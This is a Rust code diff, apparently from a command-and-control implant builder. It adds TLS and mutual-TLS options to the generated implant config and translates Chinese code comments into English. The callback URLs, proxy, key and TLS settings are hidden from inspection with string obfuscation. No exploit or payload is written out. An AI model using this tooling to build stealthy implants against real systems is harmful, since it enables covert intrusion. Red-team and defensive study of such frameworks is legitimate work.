@@ -25,13 +25,7 @@ pub fn update_core_config(server: &BasicConfig, _implant_config: &ImplantConfig)
         .map(|url| format!("\t\tobfstr::obfstr!(\"{}\").to_string(),\n", url))
         .collect();
 
-    let ca_str = if server.ca.is_empty() {
-        "".to_string()
-    } else {
-        format!("include_bytes!(\"{}\")", server.ca)
-    };
-
-    // 生成基础配置
+    // Generate basic configuration
     let mut base_config = format!(
         r#"use lazy_static::lazy_static;
 
@@ -42,7 +36,6 @@ lazy_static! {{
     pub static ref PROXY: String = obfstr::obfstr!("{proxy}").to_string();
     pub static ref URLS: Vec<String> = vec![
 {urls}      ];
-    pub static ref CA: Vec<u8> = obfstr::obfstr!("{ca}").into();
     pub static ref KEY: Vec<u8> = obfstr::obfstr!("{key}").into();
 "#,
         interval = server.interval,
@@ -50,7 +43,6 @@ lazy_static! {{
         name = server.name,
         proxy = server.proxy,
         urls = urls_str,
-        ca = ca_str,
         key = server.key,
     );
     if server.protocol == "http" {
@@ -62,12 +54,12 @@ lazy_static! {{
     if !server.proxy.is_empty() {
         let proxy_url = Url::parse(&server.proxy).expect("Invalid proxy URL format");
 
-        // 提取各个部分
+        // Extract URL components
         let scheme = proxy_url.scheme().to_string();
         let host = proxy_url.host_str().expect("Proxy URL must have host").to_string();
         let port = proxy_url.port().map(|p| p.to_string()).unwrap_or_default();
 
-        // 提取用户名和密码（分开存储）
+        // Extract username and password (store separately)
         let username = proxy_url.username().to_string();
         let password = proxy_url.password().unwrap_or("").to_string();
 
@@ -91,7 +83,59 @@ lazy_static! {{
             "# , rem = server.rem.link
         ));
     }
+
+    // Generate TLS configuration on demand
+    if server.tls.enable {
+        // Use TLS version directly from configuration
+        let tls_version = &server.tls.version;
+
+
+
+        // Server Name Indication (SNI)
+        let sni = if server.tls.sni.is_empty() {
+            "localhost".to_string()
+        } else {
+            server.tls.sni.clone()
+        };
+        let skip_verification = server.tls.skip_verification;
+
+        base_config.push_str(&format!(
+            r#"    pub static ref TLS_VERSION: String = obfstr::obfstr!("{tls_version}").to_string();
+    pub static ref TLS_SNI: String = obfstr::obfstr!("{sni}").to_string();
+    pub static ref SKIP_VERIFICATION: bool = {skip_verification};
+"#,
+            tls_version = tls_version,
+            sni = sni,
+            skip_verification = skip_verification
+        ));
+
+        // Generate mTLS configuration on demand
+        if let Some(mtls) = &server.tls.mtls {
+            if mtls.enable {
+                base_config.push_str(&format!(
+                    r#"    pub static ref TLS_MTLS_CLIENT_CERT: Vec<u8> = include_bytes!("{}").to_vec();
+    pub static ref TLS_MTLS_CLIENT_KEY: Vec<u8> = include_bytes!("{}").to_vec();
+"#,
+                    mtls.client_cert, mtls.client_key
+                ));
+                
+                // Add server CA certificate on demand
+                if !mtls.server_ca.is_empty() {
+                    base_config.push_str(&format!(
+                        r#"    pub static ref TLS_MTLS_SERVER_CA: Vec<u8> = include_bytes!("{}").to_vec();
+"#,
+                        mtls.server_ca
+                    ));
+                } else {
+                    base_config.push_str(r#"    pub static ref TLS_MTLS_SERVER_CA: Vec<u8> = Vec::new();
+"#);
+                }
+            }
+        }
+    }
+
     base_config.push_str("}");
+    
     file.write_all(base_config.as_bytes())
         .expect("write config file error");
 
@@ -138,14 +182,21 @@ pub fn update_core_toml(server: &BasicConfig, implant: &ImplantConfig) {
             }
             _ => {}
         }
-        if server.tls {
+        if server.tls.enable {
             default_feature.push("tls".to_string());
+            
+            // Check if mTLS is enabled
+            if let Some(mtls) = &server.tls.mtls {
+                if mtls.enable {
+                    default_feature.push("mtls".to_string());
+                }
+            }
         }
 
-        // 处理第三方模块配置
+        // Handle third-party module configuration
         if implant.enable_3rd {
             default_feature.push("malefic-3rd".to_string());
-            // 更新 malefic-3rd 的 Cargo.toml
+            // Update malefic-3rd Cargo.toml
             update_3rd_toml(&implant.third_modules);
         }
 
